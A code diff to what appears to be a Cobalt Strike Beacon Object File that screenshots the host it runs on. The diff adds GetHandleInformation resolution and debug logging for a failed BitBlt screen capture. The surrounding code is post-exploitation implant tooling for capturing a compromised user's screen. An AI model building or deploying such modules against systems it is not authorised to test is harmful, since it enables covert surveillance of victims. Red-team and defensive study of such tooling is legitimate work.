@@ -148,7 +148,7 @@ typedef int     (WINAPI* PFN_GetDIBits)(HDC, HBITMAP, UINT, UINT, LPVOID, LPBITM
 typedef BOOL(WINAPI* PFN_IsWindowVisible)(HWND);
 typedef DWORD (WINAPI* PFN_GetCurrentProcessId)(void);
 typedef BOOL (WINAPI* PFN_ProcessIdToSessionId)(DWORD dwProcessId, DWORD* pSessionId);
-
+typedef BOOL (WINAPI *PFN_GetHandleInformation)(HANDLE, LPDWORD);
 //-------------------------------------------------------------
 // init my func ptrs
 //-------------------------------------------------------------
@@ -189,7 +189,7 @@ static PFN_GetDIBits              pGetDIBits = NULL;
 static PFN_IsWindowVisible        pIsWindowVisible = NULL;
 static PFN_GetCurrentProcessId    pGetCurrentProcessId = NULL;
 static PFN_ProcessIdToSessionId   pProcessIdToSessionId = NULL;
-
+static PFN_GetHandleInformation pGetHandleInformation = NULL;
 //-------------------------------------------------------------
 // Dynamically resolve the required WinAPI functions because winapi limit :(
 //-------------------------------------------------------------
@@ -237,7 +237,7 @@ void ResolveAPIs(void)
     pIsWindowVisible = (PFN_IsWindowVisible)GetProcAddress(hUser32, "IsWindowVisible");
     pGetCurrentProcessId = (PFN_GetCurrentProcessId)GetProcAddress(hKernel32, "GetCurrentProcessId");
     pProcessIdToSessionId = (PFN_ProcessIdToSessionId)GetProcAddress(hKernel32, "ProcessIdToSessionId");
-
+    pGetHandleInformation = (PFN_GetHandleInformation)GetProcAddress(hKernel32, "GetHandleInformation");
 }
 
 //-------------------------------------------------------------
@@ -737,10 +737,45 @@ void go(char* buff, int len)
             return;
         }
         HGDIOBJ old_obj = pSelectObject(hDC, hBitmap);
-	if (!pBitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY)) {
-	    DWORD errorCode = GetLastError();
-	    BeaconPrintf(CALLBACK_ERROR, "[DEBUG] BitBlt failed for full screen capture. Error code: %lu", errorCode);
-	}
+        if (!pBitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY)) {
+            DWORD errorCode = GetLastError();
+            BeaconPrintf(CALLBACK_ERROR,
+                         "[DEBUG] BitBlt failed for full screen capture. Error code: %lu",
+                         errorCode);
+        
+            // Print general information about handles and region.
+            BeaconPrintf(CALLBACK_ERROR,
+                         "[DEBUG] hDC: %p, hScreen: %p, old_obj: %p",
+                         hDC, hScreen, old_obj);
+            BeaconPrintf(CALLBACK_ERROR,
+                         "[DEBUG] Screen region: x1: %d, y1: %d, width: %d, height: %d",
+                         x1, y1, w, h);
+        
+            // Additional checks to determine which handle might be invalid.
+            // Check hScreen
+            if (hScreen == NULL) {
+                BeaconPrintf(CALLBACK_ERROR, "[DEBUG] hScreen is NULL (handle invalid)");
+            } else {
+                DWORD flags = 0;
+                if (!pGetHandleInformation(hScreen, &flags)) {
+                    BeaconPrintf(CALLBACK_ERROR, "[DEBUG] hScreen appears invalid (pGetHandleInformation failed)");
+                } else {
+                    BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] hScreen is valid (flags: 0x%lx)", flags);
+                }
+            }
+        
+            // Check hDC
+            if (hDC == NULL) {
+                BeaconPrintf(CALLBACK_ERROR, "[DEBUG] hDC is NULL (handle invalid)");
+            } else {
+                DWORD flags = 0;
+                if (!pGetHandleInformation(hDC, &flags)) {
+                    BeaconPrintf(CALLBACK_ERROR, "[DEBUG] hDC appears invalid (pGetHandleInformation failed)");
+                } else {
+                    BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] hDC is valid (flags: 0x%lx)", flags);
+                }
+            }
+        }
         pSelectObject(hDC, old_obj);
         pDeleteDC(hDC);
         pReleaseDC(NULL, hScreen);
